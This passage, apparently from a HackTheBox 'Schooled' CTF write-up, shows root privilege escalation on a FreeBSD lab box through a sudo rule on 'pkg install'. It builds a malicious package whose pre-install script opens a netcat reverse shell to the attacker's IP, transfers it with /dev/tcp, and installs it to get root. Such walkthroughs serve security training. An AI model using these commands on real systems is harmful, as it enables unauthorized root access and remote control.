<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/sbin/pkg update
    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/sbin/pkg install *
</code></pre></div><p>According to <a href=https://gtfobins.github.io/gtfobins/pkg/>GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href=https://github.com/jordansissel/fpm>installed</a> first.</p>
<h4 id=malicious-package>Malicious package<a class=anchor aria-hidden=true href=#malicious-package>#</a></h4>
<p>With <code>fpm</code> installed, I can create a malicious package that contains a reverse shell using reference from GTFOBins.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «exploits» «10.10.14.49»
$ <span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span><span class=p>;</span> <span class=nb>echo</span> <span class=s1>&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class=nv>$TF</span>/x.sh<span class=p>;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class=nv>$TF</span>/x.sh <span class=nv>$TF</span>
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class=c1>#finish to prevent that.</span>
/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class=sb>`</span>initialize<span class=s1>&#39;
</span><span class=s1>        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class=sb>`</span>block in output<span class=s1>&#39;
</span><span class=s1>        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class=sb>`</span>output<span class=s1>&#39;
</span><span class=s1>        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class=sb>`</span>run<span class=s1>&#39;
</span><span class=s1>        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class=sb>`</span>run<span class=s1>&#39;
</span><span class=s1>        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
        /usr/local/bin/fpm:23:in <span class=sb>`</span>load<span class=s1>&#39;
</span><span class=s1>        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
Created package <span class=o>{</span>:path<span class=o>=</span>&gt;<span class=s2>&#34;x-1.0.txz&#34;</span><span class=o>}</span>
</code></pre></div><p>I will transfer the package to Schooled.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «exploits» «10.10.14.49»
$ <span class=k>$(</span>bash -c <span class=s1>&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class=k>)</span>
</code></pre></div><p>On Schooled:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>jamie@Schooled:~ $ nc -lv <span class=m>9000</span> &gt; x-1.0.txz
Connection from 10.10.14.49 <span class=m>60744</span> received!
jamie@Schooled:~ $
</code></pre></div><p>I will setup a Netcat listener and start to install the malicious package.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class=s1>&#39;pkg update&#39;</span> required
Checking integrity... <span class=k>done</span> <span class=o>(</span><span class=m>0</span> conflicting<span class=o>)</span>
The following <span class=m>1</span> package<span class=o>(</span>s<span class=o>)</span> will be affected <span class=o>(</span>of <span class=m>0</span> checked<span class=o>)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: <span class=m>1</span>
<span class=o>[</span>1/1<span class=o>]</span> Installing x-1.0...
</code></pre></div><p>On my listener:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class=m>53</span>
listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
connect to <span class=o>[</span>10.10.14.49<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.234<span class=o>]</span> <span class=m>23093</span>
<span class=c1># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
root
<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>wheel<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>wheel<span class=o>)</span>,5<span class=o>(</span>operator<span class=o>)</span>
Schooled
2462d8e2125d2a0
</code></pre></div><hr>
<h2 id=references>Reference(s)<a class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li><a href=https://github.com/HoangKien1020/CVE-2020-25627>https://github.com/HoangKien1020/CVE-2020-25627</a></li>
<li><a href=https://github.com/HoangKien1020/CVE-2020-14321>https://github.com/HoangKien1020/CVE-2020-14321</a></li>
<li><a href=https://gtfobins.github.io/gtfobins/pkg/>https://gtfobins.github.io/gtfobins/pkg/</a></li>
</ul>
</div>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://fahmifj.github.io/tags/freebsd/>FreeBSD</a></li>
<li><a href=https://fahmifj.github.io/tags/cve-2020-25627/>CVE-2020-25627</a></li>
<li><a href=https://fahmifj.github.io/tags/cve-2020-14321/>CVE-2020-14321</a></li>
<li><a href=https://fahmifj.github.io/tags/moodle/>Moodle</a></li>
<li><a href=https://fahmifj.github.io/tags/xss/>XSS</a></li>
<li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li>
<li><a href=https://fahmifj.github.io/tags/pkg/>pkg</a></li>
<li><a href=https://fahmifj.github.io/tags/gtfobins/>GTFOBins</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Schooled&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f&hashtags=FreeBSD%2cCVE-2020-25627%2cCVE-2020-14321%2cMoodle%2cXSS%2cSudo%2cpkg%2cGTFOBins"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f&title=HackTheBox%20-%20Schooled&summary=HackTheBox%20-%20Schooled&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f&title=HackTheBox%20-%20Schooled"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Schooled%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Schooled on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Schooled&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-schooled%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<script>var toc=document.getElementsByClassName('inner')[0],pTag=document.getElementsByClassName('post-meta')[0],fromTop=pTag.getBoundingClientRect().top,fromBottom=pTag.getBoundingClientRect().bottom;document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop+75;a>fromTop?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>